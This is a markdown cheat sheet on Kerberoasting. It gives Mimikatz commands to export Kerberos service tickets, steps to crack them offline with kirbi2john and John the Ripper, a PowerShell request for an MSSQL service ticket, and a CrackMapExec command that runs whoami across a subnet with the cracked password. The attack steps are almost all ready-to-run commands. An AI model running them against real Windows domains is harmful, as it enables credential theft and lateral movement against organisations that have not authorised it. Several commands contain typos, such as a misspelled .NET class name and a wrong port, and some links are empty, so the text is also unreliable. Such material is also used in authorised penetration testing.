Kerberoasting with mimikatz.md

## Kerberoasting

Kerberoasting is a technique used in post-exploitation where attackers request service ticket (TGS) for service accounts in windows domain. These service tickets are then cracked offline to extract the service account's plaintext hash or password. This can allow attackers to escalate privilages or perform further attacks.

---

### 1. Using Mimikatz for kerberoasting

First, ensure you have necessary privileges to run Mimikatz. the following Mimikatz commands help in listing and exporting kerberos tickets.

* Grant Debug privileges.

```bash
privilege::debug
```

* List Kerberos service tickets and export them to a file

```bash
kerberos::list /export
```

This will export the service tickets associated with the service accounts in the domain

---

### 2. Export Kerberos tickets for cracking

Once the service tickets are exported, you can use a tool like **kirbi2john** to convert the tickets into hash format suitable for cracking. this is done using the **John the Ripper** cracking tool

* Convert the kerberos tickets to a hash file using kirbi2john

```bash
kirbi2john filename > hash.txt
```

Now, you can use John the Ripper to attempt cracking the ticket hashes with a wordlist like rockyou.txt

* Crack the ticket hash using John The Ripper

```bash
john hash.txt --wordlist=rockyou.txt
```

For additional Functionality, you can check out [kerberoasrt Github Repository]() and [The ParrotSec Mimikatz Repository]()

---

### 3. PowerShell Script for Kerberoasting

You can automate the extraction of Service Principal Names (SPNs) and request service tickets using PowerShell scripts. Here's an example PowerShellscript.

* Get the Service Principal Names (SPNs)

```cmd
.\GetUserSPNs.ps1
```

* Add necessary assembly for Kerberos requestor security token

```powershell
Add-Type -AssemblyName System.IdentityModel
```

* Create a kerberos requestor security token for a specific service (e.g. MSSQL)

```poweshell
New-Object System.IdentityModel.Tokens.KerberoasRequestorSecurityToken -ArgumentList "MSSQL/armour.com:1443"
```

---

### 4. Export Kerberos Tickets using Mimikatz

If you are on a system with proper privileges, you can list and export kerberos tickets using Mimikatz 

* List and export kerberos tickets with Mimikatz.

```bash
kerberos::list /export
```

Once you have exported the tickets, you can convert it to a hash file using the following Python Script:

* Convert the ticket hash file using kirbi2john.py

```bash
python /usr/share/john/kirbi2john.py '<hash>' > MSSQLS
```

you can then attempt to crack the hash using **John The Ripper**

* Crack the ticket hash using John the Ripper

```bash
john MSSQLS --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### 5. Cracking Result Example

After cracking the ticket, you may obtain the following results:

```bash
Password123 ($krb5tgs$unknown)
```

This indicates that the Password for the ``MSSQLSvc`` service account is ``Password123``

---

### 6. Using CrackMapExec for Remote Execution 

**CrackMapExec** (CME) is a tool used for executing commands on remote system via SMB. You can use CrackMapExec to check the status for Remote System or even execute commands like ``whoami`` on a compromised system.

Here's an example of using **CrackMapExec** to execute ``whoami`` command on a remote system

* Use CrackMapExec to execute the whoami command on a remote system

```bash
crackmapexec smb 192.168.29.1/24 -u sqlserver -p Password123 -x whoami
```

This command will attempt to execute ``whoami`` on the target machine using the provided credential (<username>:<Password>)